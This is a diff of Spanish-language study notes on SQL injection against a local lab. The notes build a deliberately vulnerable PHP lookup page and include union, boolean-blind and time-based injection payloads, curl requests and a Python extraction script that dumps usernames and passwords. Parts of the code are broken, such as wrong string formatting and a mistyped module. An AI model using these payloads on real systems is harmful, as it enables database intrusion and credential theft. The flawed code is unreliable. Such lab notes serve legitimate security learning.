@@ -1,12 +1,12 @@
-> SQL inyections. Que son? Generalmente cuando te logueas en cualquier pagina lo que haces al colocar el usuario y tu contrasenia es que luego eso se envia a un servidor que debe chequear que eso coincida con algun usuario y contrasenia guardado en sus base de datos. Esto que se envia se llama **query**, esta query se puede manipular para confundir a la base de datos y darnos paso libre aun sin poner contrasenias correctas, ennumerar usuarios o revelar informacion confidencial
+> Inyección SQL es un método de infiltración de código intruso que se vale de una vulnerabilidad informática presente en una aplicación en el nivel de validación de las entradas para realizar operaciones sobre una base de datos.​
 
 
-## Herramientas
-- mariabd-server
-- apache2
-- php-mysql
+## Preparando el ambiente
+```
+sudo apt install mariadb-server php-mysql apache2
+```
 
-## Caso practico
+- Iniciando servidor de mariadb y apache 2 
 ```
 service mysql start
 lsof -i:3306
@@ -21,27 +21,28 @@ lsof -i:80
 ```
 mysql -uroot -p
 ```
-- Dentro de este panel
-- Para ver todas las bases de datos (creadas por defecto) `show databases;`
-- Para utilizar una base de dato `use mysql;`
-- Listas las tablas disponibles `show tables;`
-- Ver las columnas `describe user;`
-- Ver informacion de una tablas eligiendo las columnas `select user,password from user;`
-- Confirmar si existe un usuario `selecto user,password from user where user = 'admin';`
-- Crear una db `create Database Hacking;`
+
+## Comandos mysql
+- `show databases;` - Para ver todas las bases de datos (creadas por defecto) 
+- `use mysql;` - Para utilizar una base de dato 
+- `show tables;` - Listas las tablas disponibles 
+- `describe user;` - Ver las columnas 
+- `select user,password from user;` - Ver informacion de una tablas eligiendo las columnas 
+- `select user,password from user where user = 'admin';` - Confirmar si existe un usuario 
+- `create Database Hacking;` - Crear una db 
 - `use Hacking;`
-- Crear una tabla con las columnas y el tipo de dato`create table users(name varchar(10), password varchar(8));`
-- Agregar valores `insert into users(name, password) values('admin', 'admin123');`
-- Modificar un valor en una columna `update users set name='cele' where name='admin';`
+- `create table users(id int(8), name varchar(10), password varchar(8));` - Crear una tabla con las columnas y el tipo de dato
+- `insert into users(id, name, password) values(1, 'admin', 'admin123');` - Agregar valores 
+- `update users set name='cele' where id=1;` - Modificar un valor en una columna 
 
 ---
-### Para conectar la bd con apache2 mediante php
-`create user 'universo'@'localhost' idetified by 'paralelo22';`
+## Conectar la bd con apache2 mediante php
+`create user 'universo'@'localhost' identified by 'paralelo22';`
 Para darle todos los privilegios a ese usuario
 `grant all privileges on Hacking.* to 'universo'@'localhost'`
 
 ---
-### Crear un script en php para buscar usuarios
+## Crear un script en php para buscar usuarios
 `cd /var/www/html`
 `nvim searchUsers.php`
 ```php
@@ -52,16 +53,16 @@ Para darle todos los privilegios a ese usuario
 	$database = "Hacking";
 
 	$conn = new mysqli($server, $username, $password, $database);
-	$name = $_GET['name'];
-	$data = mysqli_query($conn, "select password from Users where name='$name'") or die(mysqli_error($conn));
+	$id = $_GET['id'];
+	$data = mysqli_query($conn, "select password from Users where id='$id'") or die(mysqli_error($conn));
 	$response = mysqli_fetch_array($data);
-	echo $response['password'];
+	echo $response['username'];
 ?>
 ```
-- En el navegador en localhost/searchUsers.php?name=admin deberia devolverte la password para ese usuario.
+- En el navegador en `localhost/searchUsers.php?id=1` deberia devolverte la password para ese usuario.
 
 ---
-### Inyecciones maliciosas
+## Inyecciones maliciosas
 - `/searchUsers.php?name=admin'` - la tilde produce un error en la sintaxis
 - `/searchUsers.php?name=admin' order by 100; -- -` - lo que hacen los dash es convertir a comentario todo lo que sigue despues, entonces podemos inyectar la query que queremos.
 - **El objetivo es descubrir cuantas columnas hay**
@@ -74,22 +75,22 @@ Para darle todos los privilegios a ese usuario
 - ``/searchUsers.php?name=admin' union select group_concat(name, ':', password) from Users; -- -``
 
 ---
-###  Sanitizando el script php
-- `$name = mysqli_real_escape_string($conn, $_GET['name']);`
+## Sanitizando el script php
+- `$id = mysqli_real_escape_string($conn, $_GET['id']);`
 
 ---
-### Que pasa cuando no me muestran resultados?
+## Que pasa cuando no me muestran resultados?
 - Hay webs que cuando se hace una peticion y no encuentra nada utiliza un error 404
-	- ```php
-	  if(isset($response[$name])){
-		  http_response_code(404);
-	  }
-	  ```
+```php
+if ( ! isset($response['username']) ){
+	http_response_code(404);
+}
+```
 - `curl -s -X GET 'http://localhost/searchUsers.php?id=1' -I` para ver el tipo de respuesta de una query
 - El problema cuando sucede esto es que no obtenemos datos, solo un codigo error
 
 ---
-### SQLI blind boolean
+## SQLI blind boolean
 - Con esta pagina podemos crear tablas temporales y probar queries, [Click](https://extendsclass.com/mysql-online.html)
 - `select(select substr(firstname,1,1) from scientist where id = 1)='a';`
 - Si hay problemas con las comillas
@@ -100,7 +101,7 @@ Para darle todos los privilegios a ese usuario
 	- `curl -s -X GET 'http://localhost/searchUsers.php' -G --data-urlencode "id=9 or (select(select ascii(substr(firstname,1,1)) from scientist where id = 1)=97)"`
 
 ---
-### Script en Python
+## Script en Python
 ```python
 #!/usr/bin/python3
 
@@ -120,7 +121,7 @@ signal.signal(signal.SIGINT, handler)
 
 # variables globales
 url = "http://localhost/searchUsers.php"
-characters = string.printable 
+# characters = string.printable 
 # 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c
 
 def makeSQLI():
@@ -133,7 +134,7 @@ def makeSQLI():
 
 	for position in range(1,150):
 		for character in range(33,126):
-			whole_request = url + '?id=9 or (select(select ascii(substr(select group_concat(username,0x3a,password) from user,%d,1)) from scientist where id = 1)=%d)' & position, character
+			whole_request = url + '?id=9 or (select(select ascii(substr(select group_concat(username,0x3a,password) from users,%d,1))=%d)' & (position, character)
 			response = request.get(whole_request)
 			p1.status(whole_request)
 			
@@ -150,7 +151,7 @@ if __name__ == "__main__":
 - **?id=9 or (select(select ascii(substring(select group_concat(`username`) from user,%d,1)) from scientist where id = 1)=%d)**
 
 ---
-### SQLI por tiempos
+## SQLI por tiempos
 - A veces nos podemos dar cuenta si una query da error o no dependiendo del tiempo que tarda el servidor en responder
 - `?id=1 and if(ascii(substring(database(),1,1))=72,sleep(5),1)` 
 ```python
